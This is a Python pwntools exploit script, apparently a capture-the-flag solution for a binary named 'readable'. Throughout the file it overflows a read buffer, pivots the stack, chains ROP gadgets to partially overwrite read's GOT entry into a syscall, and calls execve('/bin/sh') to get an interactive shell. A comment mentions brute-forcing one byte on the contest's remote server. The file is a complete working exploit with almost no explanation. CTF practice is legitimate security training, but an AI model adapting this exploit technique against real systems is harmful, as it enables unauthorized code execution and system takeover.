from pwn import *

context.arch = "amd64"

main_read = 0x400505
read_plt = 0x4003e0
read_got = 0x6008e8

ret = 0x400521
leave = 0x400520
pop_rdi = 0x400593
pop_rsi_pop_r15 = 0x400591
pop_r_12_to_15 = 0x40058c
mov_rdx_r13__mov_rsi_r14__mov_edi_r15__call_r12__add_rsp_0x8__pop_rbx__pop_rbp__pop_r_12_to_15 = 0x400570

buf_rop = 0x600a00
buf_tmp = 0x600f00

def ceil(x, y):
    return ((x / y) + (x % y > 0)) * y

def write_2_bytes(r, address, data):
    global main_read
    global buf_tmp
    payload = 'A' * 0x10
    payload += p64(address)
    payload += p64(main_read)
    r.send(payload)
    payload = data.ljust(0x10, '\x00')
    payload += p64(buf_tmp)
    payload += p64(main_read)
    r.send(payload)

def set_rsp(r, address):
    global leave
    payload = 'A' * 16
    payload += p64(address)
    payload += p64(leave)
    r.send(payload)

r = process('./readable')

raw_input()

r.send('A' * 16 + flat([buf_tmp, main_read]))

rop = flat([
    # pop rbp
    0x1,
    
    # set rax and write last byte of read_got
    pop_r_12_to_15,
    read_got,
    0x3b,
    read_got - 0x3b + 1,
    0x0,
    mov_rdx_r13__mov_rsi_r14__mov_edi_r15__call_r12__add_rsp_0x8__pop_rbx__pop_rbp__pop_r_12_to_15,
    0x0,
    0x0,
    0x1,
    0x0,
    0x0,
    0x0,
    0x0,
    
    # set rdx
    pop_r_12_to_15,
    read_got - 0x3b + 1 + 1 * 0x8,
    0x0,
    0x0,
    0x0,
    mov_rdx_r13__mov_rsi_r14__mov_edi_r15__call_r12__add_rsp_0x8__pop_rbx__pop_rbp__pop_r_12_to_15,
    0x0,
    0x0,
    0x1,
    0x0,
    0x0,
    0x0,
    0x0,

    # set rdi
    pop_rdi,
    read_got - 0x3b + 1,

    # go
    read_plt
])
rop = rop.ljust(ceil(len(rop), 16), '\x00')
for i in xrange(0, len(rop), 16):
    write_2_bytes(r, buf_rop + i, rop[i:i+16])
set_rsp(r, buf_rop - 0x10)

# In my libc last byte is 2e, but may be different in the real contest remote server ( need to brute force )
data = "/bin/sh\x00"
data += p64(ret)
r.send(data.ljust(0x3b - 1, '\x00') + "\x2e")

r.interactive()
